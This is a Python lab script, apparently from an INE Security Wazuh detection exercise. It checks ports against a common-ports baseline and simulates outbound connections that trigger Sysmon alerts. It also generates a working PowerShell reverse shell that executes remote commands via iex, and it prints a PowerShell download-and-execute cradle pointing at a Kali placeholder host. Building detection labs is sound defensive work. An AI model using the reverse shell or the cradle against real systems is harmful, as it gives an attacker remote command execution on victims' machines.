#!/usr/bin/env python3
"""
Simulate Network Attacks & Abnormal Port Connections
=====================================================
Lab: Detecting Abnormal Network Connections With Wazuh
Platform: INE Security (https://my.ine.com/labs/89688258-d373-40a5-a885-9ef8dd7b60a9)

This script provides utilities to:
1. Stage HTTP delivery for reverse shell scripts (replaces python -m SimpleHTTPServer 80)
2. Test TCP socket callbacks to uncommon ports (e.g., 4444, 1234) to trigger Sysmon Event ID 3
3. Verify if destination ports match against the common-ports baseline whitelist
"""

import sys
import os
import socket
import threading
import http.server
import socketserver
import time
import argparse

# Baseline CDB Common Ports Whitelist
DEFAULT_COMMON_PORTS = {
    21, 22, 25, 53, 80, 135, 389, 443, 445, 993, 995,
    1514, 1515, 3389, 3306, 5000, 5223, 8000, 8002, 8080, 8083, 8443
}

def start_http_staging(port=80, directory="."):
    """Starts a simple HTTP server to host payload scripts (e.g., mypowershell.ps1)."""
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=directory, **kwargs)

    print(f"[+] Starting HTTP Staging Server on 0.0.0.0:{port} hosting directory '{directory}'...")
    try:
        with socketserver.TCPServer(("", port), Handler) as httpd:
            print(f"[+] Web server active at http://0.0.0.0:{port}/")
            print("[*] Target download command:")
            print(f'    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<KALI_IP>:{port}/mypowershell.ps1\')"')
            httpd.serve_forever()
    except PermissionError:
        print(f"[-] Error: Binding to port {port} requires root/administrator privileges.")
        print(f"[*] Try running with sudo or choose a port > 1024.")
    except Exception as e:
        print(f"[-] Error: {e}")

def test_port_against_cdb(port, cdb_file=None):
    """Checks whether a port is whitelisted or triggers Rule 115001."""
    allowed_ports = set(DEFAULT_COMMON_PORTS)
    if cdb_file and os.path.exists(cdb_file):
        allowed_ports = set()
        with open(cdb_file, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    p = line.split(":")[0].strip()
                    if p.isdigit():
                        allowed_ports.add(int(p))

    port = int(port)
    if port in allowed_ports:
        print(f"[✓] Port {port} is IN the common-ports baseline (Traffic Allowed / No Alert).")
        return True
    else:
        print(f"[!] ALERT: Port {port} is NOT in the common-ports baseline!")
        print(f"    --> Will trigger Wazuh Rule 115001 (Level 10: Abnormal Network Connection)")
        return False

def simulate_tcp_connection(target_host, target_port):
    """Establishes an outbound TCP connection to simulate a C2 reverse shell callback."""
    print(f"[*] Attempting outbound TCP connection to {target_host}:{target_port}...")
    test_port_against_cdb(target_port)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((target_host, int(target_port)))
        print(f"[+] Successfully established TCP handshake with {target_host}:{target_port}")
        print("[+] Sysmon Event ID 3 will be emitted by the OS kernel.")
        time.sleep(1)
        sock.close()
    except socket.timeout:
        print(f"[-] Timeout connecting to {target_host}:{target_port} (Listener not running or firewalled).")
    except ConnectionRefusedError:
        print(f"[-] Connection refused by {target_host}:{target_port} (Port closed).")
    except Exception as e:
        print(f"[-] Connection error: {e}")

def generate_powershell_payload(listener_ip, listener_port, output_file="mypowershell.ps1"):
    """Generates the exact standalone reverse shell PowerShell payload from the lab."""
    payload = (
        f'$client = New-Object System.Net.Sockets.TCPClient("{listener_ip}",{listener_port});'
        f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
        f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
        f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
        f'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
        f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);'
        f'$stream.Flush()}};$client.Close()'
    )
    with open(output_file, "w") as f:
        f.write(payload)
    print(f"[+] Wrote reverse shell payload to {output_file} targeting {listener_ip}:{listener_port}")

def main():
    parser = argparse.ArgumentParser(
        description="Wazuh Abnormal Network Connection Lab Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Check if port 4444 or 1234 triggers an alert:
  python simulate_network_attacks.py --check-port 4444
  python simulate_network_attacks.py --check-port 80

  # Generate mypowershell.ps1 targeting Kali on port 1234:
  python simulate_network_attacks.py --gen-payload --kali-ip 10.10.21.2 --port 1234

  # Host payload via HTTP on port 80:
  python simulate_network_attacks.py --serve-http --port 80

  # Simulate TCP connection to trigger Sysmon EID 3:
  python simulate_network_attacks.py --connect --target 10.10.21.2 --port 1234
"""
    )
    parser.add_argument("--check-port", type=int, help="Check port against common-ports CDB baseline")
    parser.add_argument("--gen-payload", action="store_true", help="Generate mypowershell.ps1 payload")
    parser.add_argument("--serve-http", action="store_true", help="Start HTTP staging server")
    parser.add_argument("--connect", action="store_true", help="Simulate outbound TCP connection")
    parser.add_argument("--target", type=str, default="10.10.21.2", help="Target IP address for simulation")
    parser.add_argument("--kali-ip", type=str, default="10.10.21.2", help="Kali IP for reverse shell payload")
    parser.add_argument("--port", type=int, default=1234, help="Port number (default: 1234)")
    parser.add_argument("--cdb-file", type=str, help="Path to custom common-ports file")

    args = parser.parse_args()

    if args.check_port:
        test_port_against_cdb(args.check_port, args.cdb_file)
    elif args.gen_payload:
        generate_powershell_payload(args.kali_ip, args.port)
    elif args.serve_http:
        start_http_staging(args.port)
    elif args.connect:
        simulate_tcp_connection(args.target, args.port)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
